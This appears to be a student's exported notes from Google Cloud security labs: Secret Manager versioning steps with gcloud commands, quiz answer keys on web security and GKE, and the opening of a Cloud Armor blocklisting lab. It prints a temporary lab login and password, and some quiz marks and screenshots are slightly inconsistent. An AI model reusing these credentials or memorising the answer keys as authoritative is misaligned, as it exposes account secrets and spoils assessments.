let&#39;s use the new secret.</span></p><ol start='' ><li><p><span>At the Cloud Shell Terminal command line, enter:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud secrets versions access 2 --secret="password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If successful, you should see that the value of the password secret (</span><code>abc123</code><span>) is returned at the beginning of the next line, immediately before the command line prompt, similar to what is shown in the screenshot below:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$ gcloud secrets versions access 1 --secret="password"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">abc123student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>At the command line, try the command again - except this time, for the version, use the latest alias, as shown below:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud secrets versions access latest --secret="password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If successful, you should see that the version 2 value of the password secret (</span><code>abc123</code><span>) is returned at the beginning of the next line, immediately before the command line prompt, similar to what is shown in the screenshot below:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$ gcloud secrets versions access latest --secret="password"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">abc123student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create and use a new secret version</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-5-create-a-new-secret-version-and-invalidate-previous-versions'><span>Task 5. Create a new secret version (and invalidate previous versions)</span></h2><p><span>In this task, you create a new secret version and disable all the past versions. You also verify that only the latest version is accessible.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> of Google Cloud Console, select </span><strong><span>Security &gt; Secret Manager</span></strong><span>. The Secret Manager page shows information about the password secret that you created earlier.</span></p></li><li><p><span>Under </span><strong><span>Actions</span></strong><span>, click the More actions menu, and then click </span><strong><span>Add New Version</span></strong><span>.</span></p></li><li><p><span>For the </span><strong><span>Secret value</span></strong><span>, enter </span><code>def123</code><span>.</span></p></li><li><p><span>Select the </span><strong><span>Disable all past versions</span></strong><span> checkbox.</span></p></li><li><p><span>Leave all other values at their default setting, and click </span><strong><span>Add New Version</span></strong><span>.</span></p></li><li><p><span>Verify that only the latest version is accessible. To do so, at the Cloud Shell Terminal command line, enter:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud secrets versions access latest --secret="password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If successful, you should see that the value of the password secret (</span><code>def123</code><span>) is returned at the beginning of the next line, immediately before the command line prompt, similar to what is shown in the screenshot below:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$ gcloud secrets versions access latest --secret="password"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">def123student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>At the command line, try the command again - except this time, for the version, use the latest alias, as shown below:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud secrets versions access 2 --secret="password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This should produce a FAILED PRECONDITION error, informing you that version 2 is in the DISABLED state. (If you tried to access version 1, the same error would be produced.)</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a new secret version (and invalidate previous versions)</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-6-reinstate-and-verify-a-previous-secret-version'><span>Task 6. Reinstate and verify a previous secret version</span></h2><p><span>In this task, you re-enable the version 2 password secret and verify that the version 2 password secret is accessible.</span></p><ol start='' ><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> of Google Cloud Console, select </span><strong><span>Security &gt; Secret Manager</span></strong><span>. The Secret Manager page shows information about the password secret that you created earlier.</span></p></li><li><p><span>Click the </span><strong><span>password</span></strong><span> secret. The Details page for the password secret appears.</span></p></li><li><p><span>On the Details page, note that all three versions are shown. In the Status column, you see that version 3 is enabled and versions 1 and 2 are disabled.</span></p></li><li><p><span>For the version 2, under </span><strong><span>Actions</span></strong><span>, click the More actions menu, and then select </span><strong><span>Enable</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Enable Selected Versions</span></strong><span>. In the Status column, version 2 should now appear as enabled.</span></p></li><li><p><span>At the Cloud Shell Terminal command line, enter:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud secrets versions access 2 --secret="password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If successful, you should see that the version 2 value of the password secret (</span><code>abc123</code><span>) is returned at the beginning of the next line, immediately before the command line prompt, similar to what is shown below:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$ gcloud secrets versions access 2 --secret="password"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">abc123student_04_ceff8bd49e59@cloudshell:~ (qwiklabs-gcp-04-60caced57c66)$</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>In the upper right corner of Google Console Manager, find and click on the user icon.</span></p></li><li><p><span>Click </span><strong><span>Sign out</span></strong><span>.</span></p></li></ol><p>&nbsp;</p><h2 id='quiz-21'><span>QUIZ</span></h2><ol start='' ><li><p><span>Which TWO of the following vulnerabilities are scanned for when you use Web Security Scanner?</span></p></li></ol><ul><li><p><strong><span>Mixed content.</span></strong></p><p><span>Correct! Web Security Scanner will find instances in your applications where HTTP and HTTPS calls are mixed.</span></p></li><li><p><strong><span>Outdated or insecure libraries.</span></strong></p><p><span>Correct! Web Security Scanner will check your code libraries to make sure they are current and secure.</span></p></li><li><p><span>User data in images.</span></p></li><li><p><span>Insecure logins.</span></p></li><li><p><span>Personalized data in object names.</span></p></li></ul><p>&nbsp;</p><ol start='2' ><li><p><span>Which TWO of the following statements are TRUE when discussing the threat of OAuth and Identity Phishing?</span></p></li></ol><ul><li><p><span>Look-alike phishing sites are generally pretty easy to spot.</span></p></li><li><p><strong><span>Even small, unimportant pieces of personal data need to be secured from phishing attacks.</span></strong></p><p><span>Correct! While a small piece of personal data may not be enough on its own to allow a phisher to obtain access to a user&#39;s more sensitive data, over time these small bits can often be combined to allow user accounts to be compromised.</span></p></li><li><p><span>Credit card data is the only information that is useful to cyber hackers.</span></p></li><li><p><strong><span>Being &quot;hacked&quot; on a social site can lead to being &quot;hacked&quot; on more critical websites, depending on your social site&#39;s account settings.</span></strong></p><p><span>Correct! Some social sites allow users to &quot;link&quot; their accounts on other sites - for example, gaming sites - and that link can often be exploited.</span></p></li></ul><p>&nbsp;</p><ol start='3' ><li><p><span>Which TWO of the following statements about Application Security are TRUE?</span></p></li></ol><ul><li><p><span>&quot;Injection Flaws&quot; are the least frequently found application security issue.</span></p></li><li><p><strong><span>Applications are the most common target of cyberattack.</span></strong></p><p><span>Correct! Attackers know that the security of an application is often undefined and remains untested.</span></p></li><li><p><span>Developers are commonly given a requirements document that clearly defines security requirements for the application.</span></p></li><li><p><strong><span>Applications in general, including many web applications, do not properly protect sensitive user data.</span></strong></p><p><span>Correct! Attackers will target web applications in order to steal or modify weakly-protected data to facilitate credit card fraud, identity theft, or other data and identity crimes.</span></p><p>&nbsp;</p></li></ul><h2 id='securing-google-kubernetes-engine-techniques-and-best-practices'><span>Securing Google Kubernetes Engine: Techniques and Best Practices</span></h2><h3 id='quiz-22'><span>Quiz</span></h3><ol start='' ><li><p><span>Which ONE of the following is NOT a security best practice on Kubernetes.</span></p></li></ol><ul><li><p><span>Use shielded GKE nodes.</span></p></li><li><p><span>Upgrade your GKE infrastructure.</span></p></li><li><p><strong><span>Disable Workload Identity.</span></strong></p></li><li><p><span>Restrict access between pods.</span></p><p><span>Correct! Using Workload Identity IS a security best practice for Kubernetes.</span></p></li></ul><p>&nbsp;</p><ol start='2' ><li><p><span>&quot;Kubernetes service account&quot; and &quot;Google service account&quot; are different names for the same type of service account.</span></p></li></ol><ul><li><p><span>True</span></p></li><li><p><strong><span>False</span></strong></p><p><span>Correct! Kubernetes and Google service accounts are different types of accounts with different scopes.</span></p></li></ul><ol start='3' ><li><p><span>GKE has logging and monitoring functions built in.</span></p></li></ol><ul><li><p><strong><span>True</span></strong></p></li><li><p><span>False</span></p><p><span>Correct! In the Kubernetes dashboard summary pane, you can view a  cluster&#39;s key performance metrics, such as CPU utilization, memory  utilization, and the number of open incidents.</span></p><p>&nbsp;</p></li></ul><h1 id='11---mitigating-security-vulnerabilities-on-google-cloud'><span>11 - Mitigating Security Vulnerabilities on Google Cloud</span></h1><h2 id='protecting-against-distributed-denial-of-service-attacks-ddos'><span>Protecting against Distributed Denial of Service Attacks (DDoS)</span></h2><h3 id='lab---configuring-traffic-blocklisting-with-google-cloud-armor-2'><span>LAB - Configuring Traffic Blocklisting with Google Cloud Armor</span></h3><h4 id='overview-20'><span>Overview</span></h4><p><span>HTTP(S) Load balancing is implemented at the edge of Google&#39;s network in Google&#39;s points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google&#39;s global network to the closest backend that has sufficient capacity available.</span></p><p><a href='https://cloud.google.com/armor'><span>Google Cloud Armor</span></a><span> IP blocklists/allowlists enable you to restrict or allow access to your HTTP(S) load balancer at the edge of the Google Cloud, as close as possible to the user and to malicious traffic. This prevents malicious users or traffic from consuming resources or entering your virtual private cloud (VPC) networks.</span></p><p><span>In this lab, you will verify that the HTTP load balancer with global backends is deployed. This load balancer is automatically provisioned for you during startup. You will then create a VM to test access to the load balancer. Finally, you will stress test the load balancer and blocklist the stress test IP with Google Cloud Armor.</span></p><h4 id='objectives-17'><span>Objectives</span></h4><p><span>In this lab, you will learn how to perform the following tasks:</span></p><ul><li><p><span>Verify that the HTTP load balancer is deployed.</span></p></li><li><p><span>Create a VM to test access to the HTTP load balancer.</span></p></li><li><p><span>Use Google Cloud Armor to blocklist an IP address and restrict access to an HTTP load balancer.</span></p></li></ul><h5 id='setup-and-requirements-17'><span>Setup and requirements</span></h5><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is the </span><strong><span>Lab Details</span></strong><span> panel with the following:</span></p><ul><li><p><span>The </span><strong><span>Open Google Cloud console</span></strong><span> button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the </span><strong><span>Sign in</span></strong><span> page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-254cd7d05b81@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the </span><strong><span>Username</span></strong><span> in the </span><strong><span>Lab Details</span></strong><span> panel.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nnUTWuVBX22y</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the </span><strong><span>Password</span></strong><span> in the </span><strong><span>Lab Details</span></strong><span> panel.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To view a menu with a list of Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> at the top-left, or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" 